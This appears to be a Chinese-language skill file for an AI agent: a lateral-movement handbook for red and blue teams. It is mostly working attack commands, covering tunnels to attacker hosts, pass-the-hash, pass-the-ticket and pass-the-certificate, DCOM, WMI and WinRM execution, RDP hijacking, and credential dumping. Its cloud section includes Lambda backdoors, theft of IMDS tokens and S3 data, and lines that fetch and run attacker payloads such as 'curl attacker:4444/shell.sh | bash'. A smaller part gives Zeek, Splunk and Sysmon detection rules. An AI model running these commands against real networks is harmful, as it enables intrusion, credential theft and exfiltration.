---
name: lateral-movement
description: >
  横向移动完整手册：覆盖隧道与跳板（SSH 隧道/Port Forwarding/Chisel/Socat/earthworm/VPN
  pivot）、远程执行（WMI/WinRM/DCOM/PsExec/SMB）、凭证传递（Pass-the-Hash/Pass-the-Ticket/Overpass-the-Hash）、
  检测规则（Zeek/Splunk/Sysmon）、蓝队狩猎方法论。内置隧道工具对比矩阵、横向移动检测规则集、
  攻击路径决策树。攻防合一：Part A 攻击技术与工具 + Part B 检测与防御。
domain: cybersecurity
subdomain: offensive-security
tags:
  - lateral-movement
  - tunneling
  - pivoting
  - port-forwarding
  - wmi
  - dcom
  - pass-the-hash
  - pass-the-ticket
  - chisel
  - detection
version: 2.0.0
---

# Lateral Movement — 完整攻防手册

## 适用场景

- 渗透测试中的网络跳板和隧道建立（多网段穿透）
- 域环境横向移动（WMI/WinRM/DCOM/PsExec/PTHash/PTTicket）
- 蓝队检测横向移动行为（Zeek/Splunk/Sysmon 规则）
- 红队评估内网分段安全性

**不适用**：提权（见 privilege-escalation）、AD 域专项攻击（见 active-directory-security）、网络防御部署（见 network-defense）

## 前置条件

- 已获得初始 foothold（低权限或高权限 shell）
- 了解目标网络架构（网段/VLAN/域）
- 工具准备：Impacket, Chisel, proxychains, CrackMapExec

---

## Part A：攻击方法论

### 1. 隧道与跳板

#### 1.1 工具对比矩阵

| 工具 | 协议 | 加密 | 需要 Admin | 跨平台 | 速度 | 适用场景 |
|------|------|------|------------|--------|------|----------|
| SSH -L/-R | TCP | 是 | 否 | 是 | ★★★★ | 简单端口转发 |
| SSH -D | SOCKS | 是 | 否 | 是 | ★★★★ | SOCKS 代理 |
| Chisel | TCP/HTTP | 是 | 否 | 是 | ★★★★ | 穿越 HTTP 代理 |
| Socat | TCP | 否 | 否 | 是 | ★★★★★ | 快速 TCP 中继 |
| EarthWorm | TCP | 否 | 否 | 是 | ★★★ | SOCKS/端口转发 |
| Ligolo-ng | TCP/TLS | 是 | 否 | 是 | ★★★★ | 高性能代理 |
| Metasploit pivot | TCP | 可选 | 否 | 否 | ★★★ | MSF 集成 |
| Frp | TCP/HTTP | 可选 | 否 | 是 | ★★★ | NAT 穿透 |
| Cobalt Strike SOCKS | TCP | 是 | 否 | 否 | ★★★ | CS 集成 |

#### 1.2 SSH 隧道

```bash
# ═══ 本地端口转发（-L）═══
# 将本地 8080 转发到内网 192.168.1.100:80
ssh -L 0.0.0.0:8080:192.168.1.100:80 user@jumpbox

# 多跳转发（链式）
ssh -L 8080:192.168.1.100:80 -J user@dmz_host user@internal_host

# ═══ 远程端口转发（-R）═══
# 将远程 9090 转发到本地 3389（反弹隧道）
ssh -R 9090:127.0.0.1:3389 attacker@VPS

# ═══ 动态端口转发（SOCKS 代理）═══
ssh -D 1080 user@jumpbox
# 配合 proxychains 使用
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 192.168.2.0/24

# ═══ SSH 隧道加固/隐蔽 ═══
# 使用 SSH Config 简化
cat >> ~/.ssh/config << 'EOF'
Host jumpbox
    HostName <IP>
    User user
    DynamicForward 1080
    ServerAliveInterval 60
    ServerAliveCountMax 3
EOF

# 自动重连
autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -D 1080 user@jumpbox -N
```

#### 1.3 Chisel（HTTP 隧道）

```bash
# 攻击机（服务端）
chisel server --reverse -p 8080 --socks5

# 目标机（客户端）
# 正向 SOCKS
chisel client ATTACKER:8080 R:socks

# 反向 SOCKS（更常用）
chisel client ATTACKER:8080 R:1080:socks

# 端口转发
chisel client ATTACKER:8080 R:8888:192.168.1.100:80

# 通过 HTTP 代理
chisel client --proxy http://proxy:8080 ATTACKER:8080 R:socks

# 使用
proxychains nmap -sT -Pn 192.168.2.0/24
proxychains crackmapexec smb 192.168.2.0/24 -u user -p pass
```

#### 1.4 Ligolo-ng（高性能代理）

```bash
# 攻击机（代理端）
./proxy -selfcert

# 目标机（代理端）
./agent -connect ATTACKER:11601 -ignore-cert

# 在 Ligolo 控制台
# 添加路由（目标网段）
session --name agent1
ifadd --name ligolo --addr 192.168.2.1/24
# 启用路由
ip route add 192.168.2.0/24 via 192.168.2.1 dev ligolo

# 现在可以直接访问内网
nmap -sT -Pn 192.168.2.0/24
crackmapexec smb 192.168.2.0/24 -u user -p pass
```

#### 1.5 Socat 快速中继

```bash
# TCP 端口转发
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# 反弹端口转发
# 在攻击机
socat TCP-LISTEN:8080 TCP-LISTEN:9090
# 在目标机
socat TCP:ATTACKER:8080 TCP:127.0.0.1:3389
# 攻击机连接 localhost:9090 → 目标 3389

# UDP 转发
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53

# 通过 SOCKS 代理
socat TCP-LISTEN:8888,fork SOCKS4A:127.0.0.1:192.168.2.100:80,socksport=1080
```

### 2. Windows 远程执行

#### 2.1 WMI 远程执行

```bash
# Impacket wmiexec（最常用）
wmiexec.py domain.com/user:password@TARGET
wmiexec.py -hashes :NTLM_HASH domain.com/admin@TARGET

# 执行单条命令
wmiexec.py domain.com/user:password@TARGET "whoami /all"

# 通过代理
proxychains wmiexec.py domain.com/user:password@TARGET

# 原生 WMI（PowerShell）
# Enter-PSSession -ComputerName TARGET -Credential domain\user
# Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
```

#### 2.2 WinRM 远程执行

```bash
# CrackMapExec WinRM
crackmapexec winrm TARGET -u user -p password -x "whoami"
crackmapexec winrm TARGET -u user -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i TARGET -u admin -p password
evil-winrm -i TARGET -u admin -H NTLM_HASH

# PowerShell Remoting
# $sess = New-PSSession -ComputerName TARGET -Credential domain\user
# Invoke-Command -Session $sess -ScriptBlock { whoami }
# Enter-PSSession $sess
```

#### 2.3 DCOM 远程执行

```bash
# Impacket dcomexec
dcomexec.py domain.com/user:password@TARGET
dcomexec.py -hashes :NTLM_HASH domain.com/admin@TARGET

# PowerShell DCOM 执行
# $dcom = [Type]::GetTypeFromProgID("MMC20.Application","TARGET")
# $com = [Activator]::CreateInstance($dcom)
# $com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc.exe","7")

# ShellWindows DCOM
# $com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET")
# $obj = [Activator]::CreateInstance($com)
# $item = $obj.Item()
# $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\","open",0)
```

#### 2.4 PsExec/SMB 远程执行

```bash
# Impacket psexec
psexec.py domain.com/admin:password@TARGET
psexec.py -hashes :NTLM_HASH domain.com/admin@TARGET

# CrackMapExec SMB
crackmapexec smb TARGETS -u admin -p password -x "whoami"
crackmapexec smb TARGETS -u admin -H NTLM_HASH --exec-method smbexec -x "whoami"

# Metasploit
# use exploit/windows/smb/psexec
# set RHOST TARGET
# set SMBUser admin
# set SMBPass password
# run
```

#### 2.5 凭证传递攻击

```bash
# ═══ Pass-the-Hash ═══
crackmapexec smb TARGET -u admin -H NTLM_HASH -x "whoami"
psexec.py -hashes :NTLM_HASH domain.com/admin@TARGET
wmiexec.py -hashes :NTLM_HASH domain.com/admin@TARGET
evil-winrm -i TARGET -u admin -H NTLM_HASH

# ═══ Overpass-the-Hash (Kerberos) ═══
# 获取 TGT
getTGT.py domain.com/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# 使用 Kerberos 票据横向移动
psexec.py domain.com/user@TARGET -k -no-pass
wmiexec.py domain.com/user@TARGET -k -no-pass
smbexec.py domain.com/user@TARGET -k -no-pass

# ═══ Pass-the-Ticket ═══
# 收集票据（Mimikatz）
# sekurlsa::tickets /export
# 或 Rubeus: Rubeus.exe dump /service:krbtgt

# 使用票据
export KRB5CCNAME=ticket.ccache
psexec.py domain.com/user@TARGET -k -no-pass

# ═══ 委派攻击 ═══
# 基于资源的约束委派（RBCD）
# 1. 查找可委派的机器账户
# 2. 修改 msDS-AllowedToActOnBehalfOfOtherIdentity
# 3. 以任意用户身份获取服务票据
rbcd.py domain.com/attacker:password -dc-ip DC_IP -t TARGET -f FAKE_COMPUTER$
getST.py -spn cifs/TARGET domain.com/FAKE_COMPUTER$ -impersonate administrator
```

### 3. Linux 横向移动

```bash
# SSH 密钥利用
find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null
# 使用发现的密钥
ssh -i stolen_key user@TARGET

# SSH Agent 转发劫持
# 检查 SSH_AUTH_SOCK
echo $SSH_AUTH_SOCK
# 如果存在 → 劫持
ssh-add -l                    # 列出 agent 中的密钥
ssh -i /proc/<PID>/fd/<N> user@TARGET  # 从进程 fd 获取密钥

# NFS 挂载利用
showmount -e TARGET
mount -t nfs TARGET:/shared /mnt/nfs

# 通过隧道横向移动
proxychains crackmapexec ssh TARGETS -u root -p password
proxychains ssh user@192.168.2.100
```

---

## Part B：检测与防御

### 4. Zeek 检测脚本

```zeek
# lateral_movement_detect.zeek
module LateralDetect;

export {
    redef enum Notice::Type += {
        LateralMovement::WMI_Execution,
        LateralMovement::PsExec_Activity,
        LateralMovement::RDP_Brute_Force,
        LateralMovement::Suspicious_SMB,
        LateralMovement::Anomalous_Auth
    };
}

# 检测 PsExec（特征: 命名管道 PSEXESVC）
event smb_pipe_connect(c: connection, name: string)
{
    if (name == "\\PSEXESVC") {
        NOTICE([$note=LateralMovement::PsExec_Activity,
                $msg=fmt("PsExec activity from %s to %s", c$id$orig_h, c$id$resp_h),
                $conn=c]);
    }
}

# 检测 WMI 远程执行（DCOM 端口 135 + 高端口连接模式）
event connection_established(c: connection)
{
    if (c$id$resp_p == 135 && c$duration < 2sec) {
        # 短连接到 DCOM → 可能是 WMI 枚举
        NOTICE([$note=LateralMovement::WMI_Execution,
                $msg=fmt("Possible WMI connection from %s to %s", c$id$orig_h, c$id$resp_h),
                $conn=c]);
    }
}

# 检测 RDP 暴力破解
event connection_established(c: connection)
{
    if (c$id$resp_p == 3389) {
        # 跟踪同一源 IP 的 RDP 连接数
        # （需要维护计数器，此处为简化版）
    }
}
```

### 5. Splunk 检测查询

```spl
# ═══ PsExec 检测 ═══
index=windows sourcetype="WinEventLog:Security" EventCode=4624 LogonType=3
| where AuthenticationPackageName="NTLM"
| stats count by src_ip dest_ip user
| where count > 10
| sort -count

# ═══ WMI 远程执行检测 ═══
index=windows sourcetype="WinEventLog:Security" EventCode=4688
| search (CommandLine="*wmiprvse.exe*" OR CommandLine="*wmic*")
| table _time ComputerName CommandLine user

# ═══ Pass-the-Hash 检测 ═══
index=windows sourcetype="WinEventLog:Security" EventCode=4624 LogonType=3
| where AuthenticationPackageName="NTLM" AND NOT SubjectUserName="$*"
| stats dc(TargetComputer) as unique_targets by user src_ip
| where unique_targets > 5
| sort -unique_targets

# ═══ RDP 横向移动检测 ═══
index=windows sourcetype="WinEventLog:Security" EventCode=4624 LogonType=10
| stats count by user src_ip dest_ip
| where count > 5
| sort -count

# ═══ 服务创建（横向移动指标）═══
index=windows sourcetype="WinEventLog:Security" EventCode=4697
| table _time ComputerName ServiceName ServiceFileName SubjectUserName

# ═══ Kerberos 异常 ═══
index=windows sourcetype="WinEventLog:Security" EventCode=4768 OR EventCode=4769
| stats count by user dest_ip
| where count > 100
| sort -count

# ═══ SSH 横向移动 ═══
index=* sourcetype=linux_secure "Accepted"
| stats dc(src_ip) as sources by user host
| where sources > 3
| sort -sources
```

### 6. Sysmon 检测规则

```xml
<!-- Sysmon 横向移动检测 -->
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <!-- PsExec 检测 -->
    <RuleGroup name="PsExec" groupRelation="or">
      <Rule groupRelation="or">
        <FileCreate onmatch="include">
          <TargetFilename condition="contains">PSEXESVC.exe</TargetFilename>
        </FileCreate>
        <ProcessCreate onmatch="include">
          <Image condition="contains">PSEXESVC</Image>
          <ParentImage condition="contains">services.exe</ParentImage>
          <CommandLine condition="contains">psexec</CommandLine>
        </ProcessCreate>
      </Rule>
    </RuleGroup>

    <!-- WMI 远程执行 -->
    <RuleGroup name="WMI" groupRelation="or">
      <Rule groupRelation="or">
        <ProcessCreate onmatch="include">
          <ParentImage condition="contains">wmiprvse.exe</ParentImage>
        </ProcessCreate>
        <WmiEventConsumer onmatch="include">
          <Destination condition="contains">cmd.exe</Destination>
          <Destination condition="contains">powershell</Destination>
        </WmiEventConsumer>
      </Rule>
    </RuleGroup>

    <!-- DCOM 远程执行 -->
    <RuleGroup name="DCOM" groupRelation="or">
      <Rule groupRelation="or">
        <ProcessCreate onmatch="include">
          <ParentImage condition="contains">dllhost.exe</ParentImage>
          <ParentImage condition="contains">svchost.exe</ParentImage>
        </ProcessCreate>
      </Rule>
    </RuleGroup>

    <!-- 凭证传递 -->
    <RuleGroup name="CredPassing" groupRelation="or">
      <Rule groupRelation="or">
        <NetworkConnect onmatch="include">
          <DestinationPort condition="is">445</DestinationPort>
          <DestinationPort condition="is">135</DestinationPort>
          <DestinationPort condition="is">5985</DestinationPort>
          <DestinationPort condition="is">5986</DestinationPort>
        </NetworkConnect>
      </Rule>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

### 7. 网络层防御

```bash
# 7.1 微分段（限制横向移动）
# 防火墙规则：仅允许业务必要的端口通信
# 工作站 → 工作站：默认拒绝
# 工作站 → 服务器：仅允许 80,443,445（如需要）
# 服务器 → 服务器：仅允许应用端口

# 7.2 禁用不必要的服务
# 禁用 WMI 远程（如不需要）
# GPO: Computer Config > Admin Templates > Network > Network Connections
# 禁用 WinRM（如不需要）
Set-Service WinRM -StartupType Disabled
Stop-Service WinRM

# 7.3 启用 SMB 签名
# 防止 NTLM 中继攻击
# GPO: Microsoft network server: Digitally sign communications (always)

# 7.4 RDP 限制
# 启用 NLA（Network Level Authentication）
# 限制 RDP 仅通过 VPN/跳板机访问
# 启用 Restricted Admin Mode（防止凭据传递）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# 7.5 LDAP 签名
# 防止 LDAP 中继攻击
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 2 /f
```

---

## 速查表

### 横向移动方法对比

| 方法 | 端口 | 需要密码 | 需要Hash | 需要Ticket | 隐蔽性 | 检测难度 |
|------|------|---------|---------|------------|--------|----------|
| PsExec | 445 | 可 | 可 | 否 | 低 | 容易（服务创建） |
| WMI | 135 | 可 | 可 | 否 | 中 | 中 |
| WinRM | 5985/5986 | 可 | 可 | 否 | 中 | 中 |
| DCOM | 135+高端口 | 可 | 可 | 否 | 中 | 较难 |
| SSH | 22 | 可 | 否 | 否 | 高 | 较难 |
| RDP | 3389 | 可 | 可 | 否 | 低 | 容易 |
| PtH (SMB) | 445 | 否 | 是 | 否 | 中 | 中 |
| PtH (WMI) | 135 | 否 | 是 | 否 | 中 | 较难 |
| Overpass-the-Hash | 88+445 | 否 | 是 | 获取TGT | 高 | 难 |
| Pass-the-Ticket | 88+445 | 否 | 否 | 是 | 高 | 难 |
| SSH 隧道 | 22 | 可 | 否 | 否 | 高 | 难 |

### 隧道工具速选

```
需要什么？
├── 快速端口转发（单端口）
│   └── socat / SSH -L
├── SOCKS 代理（多端口扫描）
│   ├── 有 SSH 访问
│   │   └── SSH -D + proxychains
│   ├── 只有 HTTP 出站
│   │   └── Chisel（HTTP 隧道）
│   └── 需要高性能
│       └── Ligolo-ng
├── 反弹隧道（目标在内网）
│   └── SSH -R / Chisel reverse
├── 多层跳板
│   └── SSH ProxyJump / Ligolo-ng 多 session
└── 长期隐蔽
    └── autossh + SSH -D
```

### 蓝队狩猎检查清单

```
[ ] 监控 EventID 4624 LogonType=3（网络登录）频率
[ ] 监控 EventID 4624 LogonType=10（RDP 登录）来源
[ ] 监控服务创建 EventID 4697
[ ] 监控 PsExec 服务安装
[ ] 监控 WMI 远程进程创建
[ ] 监控 NTLM 认证日志（EventID 4624, Package=NTLM）
[ ] 监控 Kerberos 票据请求异常
[ ] 监控 135/445/5985 端口的异常连接模式
[ ] 监控同一账户对多台机器的登录
[ ] 监控非工作时间的远程登录
[ ] 部署 Sysmon 进程创建审计
[ ] 部署 Zeek SMB/DNS 分析
[ ] 建立 SMB 流量基线
[ ] 检查 RDP NLA 是否启用
[ ] 验证 SMB 签名是否启用
```

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 对应活动 |
|------|---------|----------|----------|
| 横向移动 | T1021.001 | Remote Desktop Protocol | RDP 横向移动 |
| 横向移动 | T1021.002 | SMB/Windows Admin Shares | PsExec/SMB 执行 |
| 横向移动 | T1021.006 | Windows Remote Management | WinRM 执行 |
| 横向移动 | T1047 | WMI | WMI 远程执行 |
| 横向移动 | T1059.001 | PowerShell | PowerShell Remoting |
| 横向移动 | T1563.002 | RDP Hijacking | RDP 会话劫持 |
| 横向移动 | T1210 | Exploitation Remote Services | 漏洞利用 |
| 命令控制 | T1572 | Protocol Tunneling | SSH/Chisel 隧道 |
| 凭证访问 | T1550.002 | Pass the Hash | NTLM 哈希传递 |
| 凭证访问 | T1550.003 | Pass the Ticket | Kerberos 票据传递 |
| 防御规避 | T1090 | Proxy | 代理/跳板 |
| 防御规避 | T1090.001 | Internal Proxy | 内部代理 |

---

## Part C：2025-2026 更新

### 8. 凭证传递攻击完整矩阵

#### 8.1 四类凭证传递对比

| 攻击类型 | 凭证格式 | 协议 | 前提条件 | 防御措施 | MITRE ID |
|----------|---------|------|---------|---------|----------|
| Pass-the-Hash (PtH) | NTLM Hash | NTLM/SMB | 获取 NTLM Hash | Credential Guard, 禁用 NTLM | T1550.002 |
| Pass-the-Ticket (PtT) | Kerberos TGT/TGS | Kerberos | 获取票据文件 | 票据生命周期监控 | T1550.003 |
| Pass-the-Key (PtK) | Kerberos 密钥 (AES/RC4) | Kerberos | 获取用户密钥 | AES256 强制模式 | T1550.003 |
| Pass-the-Certificate (PtC) | X.509 证书 | PKINIT/Kerberos | 获取证书+私钥 | CA 审计, 证书模板加固 | T1549 |

#### 8.2 Pass-the-Certificate（证书传递）

```bash
# 2025 年最重要的横向移动技术之一
# 利用 AD CS 颁发的证书代替密码/Hash 进行认证

# 1. 枚举可用的证书模板
certipy find -u user@domain.com -p password -dc-ip DC_IP
# 关注 ESC1-ESC8 模板滥用场景

# 2. 利用易受攻击的证书模板（ESC1）
certipy req -u user@domain.com -p password -ca CA_NAME -template VULN_TEMPLATE -upn administrator@domain.com

# 3. 使用证书获取 TGT（PKINIT）
certipy auth -pfx administrator.pfx -domain domain.com

# 4. 使用票据进行横向移动
export KRB5CCNAME=admin.ccache
psexec.py domain.com/administrator@TARGET -k -no-pass
wmiexec.py domain.com/administrator@TARGET -k -no-pass

# 5. Shadow Credentials 攻击（利用 msDS-KeyCredentialLink）
certipy shadow auto -u attacker@domain.com -p password -account TARGET_ACCOUNT
```

#### 8.3 Pass-the-Key 完整流程

```bash
# 从内存中提取 Kerberos 密钥
# Mimikatz:
# sekurlsa::ekeys
# 或使用 Impacket
secretsdump.py domain.com/admin:password@TARGET

# 使用 AES256 密钥
getTGT.py domain.com/user -aesKey AES256_KEY -dc-ip DC_IP
export KRB5CCNAME=user.ccache
wmiexec.py domain.com/user@TARGET -k -no-pass

# 使用 RC4 密钥
getTGT.py domain.com/user -hashes :NTLM_HASH -dc-ip DC_IP
```

### 9. WMI/WinRM/DCOM 远程执行（深度版）

#### 9.1 WMI 高级利用

```bash
# ═══ WMI 持久化 + 横向移动 ═══
# WMI 事件订阅持久化（无文件）
# PowerShell:
# $filter = Set-WmiInstance -Class __EventFilter -Arguments @{
#     Name = "Backdoor"; EventNameSpace = "root\cimv2";
#     QueryLanguage = "WQL"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
# }
# $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
#     Name = "BackdoorConsumer"; CommandLineTemplate = "cmd.exe /c whoami"
# }
# Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}

# ═══ WMI 远程执行绕过 AV ═══
# 使用 COM 对象而非 wmic.exe
# $proc = [WMICLASS]"\\TARGET\root\cimv2:Win32_Process"
# $proc.Create("powershell -enc <BASE64_PAYLOAD>")

# CrackMapExec WMI 批量执行
crackmapexec smb TARGETS -u admin -H NTLM_HASH --exec-method wmiexec -x "whoami"

# Impacket-atexec（计划任务 + WMI）
atexec.py domain.com/admin:password@TARGET "whoami /all"
atexec.py -hashes :NTLM_HASH domain.com/admin@TARGET "cmd /c whoami"
```

#### 9.2 WinRM 完整利用链

```bash
# ═══ Evil-WinRM 高级用法 ═══
evil-winrm -i TARGET -u admin -H NTLM_HASH -s /scripts/ -e /exe/
# 上传/下载
upload local_file remote_path
download remote_path local_path
# 加载 PowerShell 模块
menu
# 使用 Bypass-4MSI 绕过 AMSI
Bypass-4MSI

# ═══ NetExec (原 CrackMapExec) ═══
# WinRM 命令执行
nxc winrm TARGETS -u admin -p password -x "whoami"
nxc winrm TARGETS -u admin -H NTLM_HASH -X "$ExecutionContext.SessionState.LanguageMode"

# 通过 WinRM 执行 PowerShell 脚本
nxc winrm TARGET -u admin -p password -x "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"

# ═══ 检测 WinRM ═══
# Event ID 4624 LogonType=3 + 进程 wsmprovhost.exe
```

#### 9.3 DCOM 无文件横向移动

```bash
# ═══ Trapped COM 对象（2025 新技术）═══
# 利用 COM 对象按引用封送实现无文件远程执行
# 无需在目标写入任何文件

# MMC20.Application DCOM
# [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","TARGET")).Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc.exe","7")

# ShellWindows DCOM（不创建服务、不写文件）
# $com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET")
# $obj = [Activator]::CreateInstance($com)
# $obj.Item().Document.Application.ShellExecute("cmd.exe","/c whoami","c:\","open",0)

# Excel DCOM（Office 已安装时）
# $com = [Type]::GetTypeFromProgID("Excel.Application","TARGET")
# $excel = [Activator]::CreateInstance($com)
# $excel.DisplayAlerts = $false
# $excel.ExecuteExcel4Macro("EXEC(""cmd /c whoami"")")

# Impacket dcomexec
dcomexec.py -object MMC20 domain.com/admin:password@TARGET
dcomexec.py -object ShellWindows domain.com/admin:password@TARGET
dcomexec.py -object ShellBrowserWindow domain.com/admin:password@TARGET
```

### 10. RDP 劫持与 Shadow Session

#### 10.1 RDP 劫持（tscon.exe）

```bash
# ═══ 前提：需要 SYSTEM 权限 ═══
# 枚举 RDP 会话
query session
# 或
qwinsta

# 劫持指定会话（无需密码）
# tscon SESSION_ID /dest:console
tscon 3 /dest:console

# 通过指定会话名劫持
tscon RDP-Tcp#0 /dest:console

# ═══ 使用 Mimikatz 劫持 ═══
# tscon::sessionst
# tscon::sessionst /id:SESSION_ID

# ═══ 检测 RDP 劫持 ═══
# Event ID 4624 LogonType=10 + 源会话 != 目标会话
# 新创建的 tscon.exe 进程运行身份为 SYSTEM
# Sysmon Event ID 1: Image=tscon.exe AND User=NT AUTHORITY\SYSTEM
```

#### 10.2 RDP Shadow Session（影子会话）

```bash
# ═══ 远程影子会话（无需劫持）═══
# 查看目标 RDP 会话
# mstsc /shadow:SESSION_ID /v:TARGET
# /control - 可交互控制
# /noConsentPrompt - 无需用户同意

# 通过注册表启用 Shadow
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f
# 值: 0=禁用, 1=全控制, 2=只读, 3=全控制需用户同意, 4=只读需用户同意

# 通过 WMI 远程启用并连接
# 1. 远程修改注册表
reg add \\TARGET\HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services /v Shadow /t REG_DWORD /d 2 /f
# 2. 枚举会话
qwinsta /server:TARGET
# 3. Shadow 连接
mstsc /shadow:SESSION_ID /v:TARGET /control

# ═══ Restricted Admin Mode ═══
# 启用后允许 PtH 通过 RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# 使用 Hash 连接 RDP
xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH
```

#### 10.3 RDP 凭据窃取

```bash
# 从 RDP 连接中提取保存的凭据
# .rdp 文件
cmdkey /list
# 导出
cmdkey /list | findstr "Target"

# Mimikatz 提取 RDP 凭据
# dpapi::cred /in:"%APPDATA%\Microsoft\Credentials\HASH"
# sekurlsa::dpapi

# 从注册表提取 Terminal Server 凭据
reg save "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" logonui.hiv
```

### 11. DNS Admins 提权与横向移动

```bash
# ═══ DNSAdmins 组滥用 ═══
# 前提：用户属于 DNSAdmins 组
whoami /groups | findstr DNSAdmins

# 1. 加载自定义 DLL（SYSTEM 权限执行）
# 准备恶意 DLL（或使用 dbutil.dll）
# dnscmd /config /serverlevelplugindll \\ATTACKER\share\malicious.dll

# 2. 重启 DNS 服务触发加载
sc \\TARGET stop dns
sc \\TARGET start dns

# 3. 使用 Impacket 实现
# 修改 dnsPlugin 属性
# 获取 SYSTEM shell 后横向移动

# ═══ WPAD 欺骗 + DNS ═══
# 禁用全局查询阻止列表
# 修改 DNS 配置允许 WPAD 解析
dnscmd /config /globalqueryblocklist
# 配合 NBNS 欺骗或 LLMNR 欺骗
# 诱使目标通过 WPAD 下载恶意 PAC 文件

# ═══ 检测 DNS Admins 滥用 ═══
# Event ID 5136 - 目录服务对象修改
# Event ID 4662 - 对 dnsPlugin 属性的写操作
# 监控 dnscmd.exe /config /serverlevelplugindll 调用
```

### 12. Cloud 横向移动

#### 12.1 AWS 横向移动

```bash
# ═══ IAM 凭证利用 ═══
# 枚举 IAM 凭证
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-access-keys --user-name TARGET_USER

# ═══ EC2 横向移动 ═══
# 通过 User Data 注入
aws ec2 run-instances --image-id ami-xxx --user-data file://rev.sh
# 通过 SSM 远程执行
aws ssm send-command --instance-ids i-xxx --document-name "AWS-RunShellScript" --parameters commands=["whoami"]
aws ssm send-command --instance-ids i-xxx --document-name "AWS-RunPowerShellScript" --parameters commands=["whoami"]

# ═══ Lambda 横向移动 ═══
# 枚举 Lambda 函数
aws lambda list-functions
# 修改 Lambda 函数代码植入后门
aws lambda update-function-code --function-name TARGET_FUNC --zip-file fileb://backdoor.zip
# 调用函数触发
aws lambda invoke --function-name TARGET_FUNC response.json

# ═══ EKS/K8s 横向移动 ═══
aws eks update-kubeconfig --name CLUSTER_NAME
kubectl get pods --all-namespaces
kubectl exec -it TARGET_POD -- /bin/sh

# ═══ S3 数据窃取 ═══
aws s3 ls
aws s3 sync s3://sensitive-bucket ./stolen/

# ═══ 检测 AWS 横向移动 ═══
# CloudTrail: 同一 AK/SK 对多区域/多服务的 API 调用
# GuardDuty: Unusual API call pattern
# CloudTrail: iam:AssumeRole 异常频率
# EventBridge: EC2 User Data 修改告警
```

#### 12.2 Azure 横向移动

```bash
# ═══ Entra ID (原 Azure AD) 横向移动 ═══
# 枚举租户信息
az login
az account list
az ad user list
az ad group list

# ═══ VM 横向移动 ═══
# 通过 RunCommand 远程执行
az vm run-command invoke --ids /subscriptions/xxx/vmName TARGET --command-id RunShellScript --scripts "whoami"
# 通过 Custom Script Extension
az vm extension set --vm-name TARGET --name CustomScript --publisher Microsoft.Azure.Extensions --settings '{"fileUris":["https://attacker/payload.sh"],"commandToExecute":"sh payload.sh"}'

# ═══ Managed Identity 滥用 ═══
# 从 IMDS 获取托管标识令牌
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
# 使用令牌横向移动到其他 Azure 资源

# ═══ Azure AD 应用注册滥用 ═══
# 创建后门应用 + 证书凭据
az ad app create --display-name "legit-app" --key-type cert --key-value @cert.pem
az ad sp create --id APP_ID
az role assignment create --assignee SP_ID --role Owner --scope /subscriptions/SUB_ID

# ═══ 检测 Azure 横向移动 ═══
# Azure Activity Log: RunCommand 调用
# Microsoft Defender for Cloud: 异常 RDP/SSH 登录
# Entra ID Sign-in Log: 非常规位置的登录
# Azure AD Audit Log: 应用注册/服务主体创建
```

#### 12.3 GCP 横向移动

```bash
# ═══ 凭证枚举 ═══
gcloud auth list
gcloud config configurations list
gcloud iam service-accounts list

# ═══ Compute Engine 横向移动 ═══
# 通过 startup-script 注入
gcloud compute instances add-metadata TARGET --metadata startup-script='#! /bin/bash
curl attacker:4444/shell.sh | bash'
# 通过 OS Login SSH
gcloud compute ssh TARGET --zone=ZONE

# ═══ Cloud Function 横向移动 ═══
gcloud functions list
gcloud functions deploy backdoor --trigger-http --runtime python39 --entry-point main --source ./backdoor/

# ═══ Service Account 密钥滥用 ═══
gcloud iam service-accounts keys create key.json --iam-account SA@PROJECT.iam.gserviceaccount.com
# 使用窃取的密钥
gcloud auth activate-service-account --key-file stolen-key.json

# ═══ 检测 GCP 横向移动 ═══
# Cloud Audit Logs: compute.instances.addMetadata
# Cloud Audit Logs: iam.serviceAccountKeys.create
# Security Command Center: 异常 API 调用模式
# VPC Flow Logs: 非常规内网连接
```

#### 12.4 云元数据 SSRF → IAM 凭据（路由指针）

> 生态边界：本模式不展开完整链，SSRF 到 IMDS 的「元数据 → IAM/托管标识凭据 → 提权」完整攻击面归
> `cloud-k8s` / `competition-cloud-metadata-path` 技能（以及 `competition-ssrf-metadata-pivot`）。
